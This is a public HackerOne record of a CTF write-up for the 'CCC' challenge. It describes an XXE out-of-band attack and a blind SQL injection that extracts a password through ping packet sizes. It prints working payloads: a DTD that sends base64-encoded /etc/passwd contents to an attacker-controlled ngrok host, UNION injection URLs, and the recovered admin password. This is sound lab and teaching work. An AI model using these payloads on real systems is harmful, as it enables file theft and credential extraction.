{"id":1217702,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE3NzAy","url":"https://hackerone.com/reports/1217702","title":"Adam and the  Deadly  Injections","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2021-06-04T17:42:52.214Z","submitted_at":"2021-06-04T17:42:52.280Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"akshansh","url":"/akshansh","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Ghy55ytJLjJt7ZfRXk6jWyYz/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-06-18T04:58:09.641Z","bug_reporter_agreed_on_going_public_at":"2021-06-18T02:14:38.950Z","team_member_agreed_on_going_public_at":"2021-06-18T04:58:09.498Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi team adding the  flag here \n```\n███\n```\n\n████\n\nI will do the writeup in the below comments before the deadline itself\nThanks \nAkshansh\n\n## Impact\n\n....","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":8,"name":"Out-of-bounds Read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-07-18T02:14:39.038Z","allow_singular_disclosure_after":-7384698.70601977,"singular_disclosure_allowed":true,"vote_count":13,"voters":["k1ra_","sudi","dhakal_bibek","masahiyaku","betterkeptblank","winstoncodes","roughfox","rascoc","siyamex","ekgaribadmi","and 3 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":72510,"asset_type":"URL","asset_identifier":"*.ccc.h1ctf.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":11988575,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for participating in the CCC CTF!\n","automated_response":false,"created_at":"2021-06-04T18:09:52.860Z","updated_at":"2021-06-04T18:09:52.860Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":11993690,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Summary:\nThe CTF was divided in two half where Adam divided his evil injections in two variants \n1. File Read via XXE OOB  \n2. SQL Injection Data Exfil via Ping\n\n\n\n# File Read via XXE OOB\n## Summary Video\n\n{F1327202}\n\nThe CTF began with scope https://ccc.h1ctf.com/  on the website there was log in and register functionalities but these functionalities didnt looked directly looked exploitable,Upon register we will get our hash for profile\nhttps://ccc.h1ctf.com/u/s2goip  {s2goip}  was hash which was not looking exploitable directly\non the webiste itself there was mention of CCC designs twitter handle on the Twitter handle there was one screenshot https://twitter.com/DesignsCcc/status/1398629597298806786/photo/1\nin which the second tab showed the path of error_-_-_log.t after trying among extensions we got txt extension was the right one thereby full link was ```https://ccc.h1ctf.com/error_-_-_log.txt```\n\n{F1327225}\n\n\nAll of the above log files had rabbit holes and no clue to move forward until one thing in common they had h1- as prefix and bucket names example as https://h1-{hash}.s3.eu-west-2.amazonaws.com/files.xml    also remember the hash in beginning of profile creation we got length was same 6 digit this was matching as a pattern for  path prefix hash as in once we log we see as https://ccc.h1ctf.com/u/{hash} so here this hash will internally call for https://h1-{hash}.s3.eu-west-2.amazonaws.com/files.xml and query the given files.xml XML so on the account we made we had   https://ccc.h1ctf.com/u/name  so we need to create an s3 bucket with name h1-name for region eu-west-2.\n\n\nUpon making creating the bucket I added a simple pingback XML file which confirmed the presence of XXE injection \n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE testping [\u003c!ENTITY xxe SYSTEM \"http://controlledserver.com\"\u003e ] \u003e\n\u003ctestping\u003e\n\t\u003cr\u003e\u0026xxe;\u003c/r\u003e\n\u003ctestping\u003e\n```\n\n\nNow we need to exfil local files out so, therefore, we would need a DTD file where we can reference in local files to call for this I used ngrok to create a public URL and  python httpserver to point to ngrok\nInitially, i tried with few XXE payloads to read file but they were not working seemed like filter or restriction to overcome that i tried that PHP encode base64  filter and made a payload as\n\n```\n\u003c?xml version=\"1.0\" ?\u003e\n\u003c!DOCTYPE r [\n\u003c!ELEMENT r ANY \u003e\n\u003c!ENTITY % sp SYSTEM \"http://something.ngrok.io/dtd.xml\"\u003e\n%sp;\n%param1;\n]\u003e\n\u003cr\u003e\u0026exfil;\u003c/r\u003e\n```\n\nHosted Locally\ndtd.xml\n\n```\n\u003c!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"\u003e\n\u003c!ENTITY % param1 \"\u003c!ENTITY exfil SYSTEM 'http://something.ngrok.io/dtd.xml?%data;'\u003e\"\u003e\n\n```\n\nNow upon loading the profile on my server i could see logs of base64 encoded of etc/passwd now we can query for files in system , on CCC designs in their tweet they mentioned \n\n```\nDoes anyone know if in nginx you can link a directory to a proxy_pass\n```\nTherefore it meant maybe they are running more server on some paths to know this we would need to query /etc/nginx/sites-enabled/default  as we change our DTD file with this path we get the file where we can see as below\n\n{F1327226}\n\n\n```\n#server {\n#    server_name ccc.h1ctf.com;\n#    root /var/www/app/public;\n#    index index.php;\n#    location / {\n#            try_files $uri $uri/ /index.php?$query_string;\n#    }\n#     location /2b5d2b11513d2c9b {\n#       proxy_pass http://127.0.0.1:8888;\n#     }\n#\n#    location ~ \\.php$ {\n#            include snippets/fastcgi-php.conf;\n#            fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;\n#    }\n#    listen 443 ssl;\n#    ssl_certificate /etc/letsencrypt/live/ccc.h1ctf.com/fullchain.pem;\n#    ssl_certificate_key /etc/letsencrypt/live/ccc.h1ctf.com/privkey.pem;\n#    include /etc/letsencrypt/options-ssl-nginx.conf;\n#    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n#}\n\n```\n\nHere we can see /2b5d2b11513d2c9b which begins our final destination https://ccc.h1ctf.com/2b5d2b11513d2c9b to hit nail in coffin but adam evilness is yet to come.\n\n\n\n# SQL Injection Data Exfil via Ping\n## Summary Video:\n\n█████████\n\nUpon doing a dirsearch on this path i got https://ccc.h1ctf.com/2b5d2b11513d2c9b/.git/config file which referenced to https://github.com/ccc-labs/pinger/ where we had full source code to pinger server \n\n{F1327230}\n\nUpon analyzing the source code we can see inside there is a reference call to \n/api/ping?id=  which is used by Controller\\Pinger::ping()  function which first checks one IP can call function send($_GET[\"id\"]) only one time in one minute. Now the send send function as we see below is vulnerabnle to SQL injection coz its appending user input id on line 5and not using parameterized query. \n\n\n\n```\nclass Ping\n{\n\n    public static function send( $id ){\n        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';\n        $d = Db::connect()-\u003eprepare($sql);\n        $d-\u003eexecute();\n        //Confirm we've found a matching row in the database\n        if( $d-\u003erowCount() == 1 ){\n            $host = $d-\u003efetch();\n            $ip = $host[\"ip\"];\n            $packet_size = intval($host[\"packet_size\"]);\n            //make sure PING packet size between 1 and 65527\n            if( $packet_size \u003e 0 \u0026\u0026 $packet_size \u003c 65528 ) {\n                //check IP is a valid IPv4 Address\n                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {\n                    //SEND 4 PING PACKETS IN THE BACKGROUND\n                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  \u003e /dev/null \u0026');\n                }\n            }\n        }\n    }\n\n}\n\n```\nSo seeing the file db.sql we can see that for the database for our use case we have \nhost table with columns (`id`, `ip`, `packet_size`)  and user table with columns (`id`, `username`, `password`) \n\nshell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  \u003e /dev/null \u0026');\n\nHere the IP and packet size fetched from the SQL statement is passed to ping command so because of SQL Injection we can now also ping our IP\nas https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=999+union+all+select+1,'0.0.0.0',32--+-\nwhere instead of 0.0.0.0 we add our IP and we can see pingback. To confirm injection and pingback we need a listener this can be enabled on VPS by adding network setting to listen for ICMP ,i have used tcpdump on my host machine\n\n\nBut problem and pain start here again first is we cannot see a direct response from SQL injection as the ping function will send us packet size and IP details only and the second problem is we can hit requests with one IP only once per minute.\n\n\nTo exfiltrate data and avoid WAF we can use UNION query and since we can send packet size as output from SQL query which we can recieve inspecting ping packets.  So now our mission statement is to exfil password from user table as we saw in Readme user is admin but the password was changed but problem is we dont know password length and it can be exfilled as numerical value only so what here we can do is get byte value in numerical sense and later convert it to ASCII value. also a point to note headers will add to +8 of actual value so we need to subtract that\n\nFor the above the query to fetch password from user table the query  will look like \n\n```\nhttps://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=12+union+all+select+1,'23.99.114.248',ASCII(SUBSTRING(password,1,1))+FROM+`user`+LIMIT+1--+-\n```\n\nhere with each request we will recieve one character of password thereby adding ASCII(SUBSTRING(password,2,1)) =\u003e ASCII(SUBSTRING(password,3,1)) and so on to retrive full length of password. \nI'm really lazy person so here i used burp extension IP-rotate with an intruder to query for all characters i tried from 1 to 30 and as result, i got 21 different packet size responses\n\n{F1327233}\n\nbut these were ASCII +8 character values so i needed to substract -8 from each of them so it finally became \n\nSo on listener logs I did simple grep+substract as in video also\n\n55 64 37 39 5E 31 48 48 4A 24 57 2A 49 4F 62 61 4B 64 51 67 49\nwhich translates to Ud79^1HHJ$W*IObaKdQgI\n\nthereby now we can log in to \nwith \n```\nusername: admin\npassword: Ud79^1HHJ$W*IObaKdQgI\n```\n\nupon login, we can see our flag\n\n██████████","automated_response":false,"created_at":"2021-06-05T12:31:38.159Z","updated_at":"2021-06-17T22:19:20.803Z","actor":{"username":"akshansh","cleared":false,"url":"/akshansh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Ghy55ytJLjJt7ZfRXk6jWyYz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1327233,"filename":"Screenshot_from_2021-06-05_17-49-00.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/phawb7844q1rtwjur651qqjfjivm?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-06-05_17-49-00.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-06-05_17-49-00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a94f5a3dee8877ceb3bcb2a9a5de0902bf35aa1fcf9d89ac70a376bede7039d7"},{"id":1327230,"filename":"Screenshot_from_2021-06-05_17-19-19.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9u9m4acvqbmfh42gnnzc0mnish3r?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-06-05_17-19-19.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-06-05_17-19-19.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4a8bc711d677630503742743d786317cec0e75dc7230702dba7cff6afe723502"},{"id":1327226,"filename":"Screenshot_from_2021-06-05_17-42-14.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ldltzgioc6e1fuas60l57yxlpuwy?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-06-05_17-42-14.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-06-05_17-42-14.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=514bdfd244c9c40b1cc941c55479a149adbea1dc65f291d21cd921d8d21479e3"},{"id":1327225,"filename":"Screenshot_from_2021-06-05_17-41-38.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m5awsrjsc4x0oxesr6wppkoo7e6b?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-06-05_17-41-38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-06-05_17-41-38.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2539407b3ad24f6711e7adcfc279b15d0b1614324a7777447cb749b4477d4c3a"},{"id":1327202,"filename":"Screencast_06-05-2021_04_31_09_PM.webm","type":"video/webm","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aigjal7eurqu1jw8e9tgc8ebdkgq?response-content-disposition=attachment%3B%20filename%3D%22Screencast_06-05-2021_04_31_09_PM.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_06-05-2021_04_31_09_PM.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e819bede4b7d2a8d6ee2fb138ce7ca6b9cd0009a8c6d802b362e0547db200f1e"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12161021,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the detailed write-up and videos! \n\nI have redacted and removed any references to the flag including some of your screenshots. If you chose to release your own write-up, please make sure to remove the flag from your post.\n\nThanks and happy hacking! ","automated_response":false,"created_at":"2021-06-17T22:19:43.262Z","updated_at":"2021-06-17T22:19:43.262Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"akshansh","url":"/akshansh"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12161022,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-06-17T22:19:54.029Z","updated_at":"2021-06-17T22:19:54.029Z","actor":{"url":"/h1-ctf","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"h1-ctf"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"100.0","genius_execution_id":null,"team_handle":"h1-ctf","collaborator":{"username":"akshansh","url":"/akshansh"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12161901,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you so much H1 team and Adam for making the CTF happen,its always a new learning opportunity through the CTF's here hope to see a new one soon :)","automated_response":false,"created_at":"2021-06-18T02:14:38.992Z","updated_at":"2021-06-18T02:14:38.992Z","first_to_agree":true,"actor":{"username":"akshansh","cleared":false,"url":"/akshansh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Ghy55ytJLjJt7ZfRXk6jWyYz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12162474,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for participating! ","automated_response":false,"created_at":"2021-06-18T04:58:09.539Z","updated_at":"2021-06-18T04:58:09.539Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12162475,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-18T04:58:09.688Z","updated_at":"2021-06-18T04:58:09.688Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dd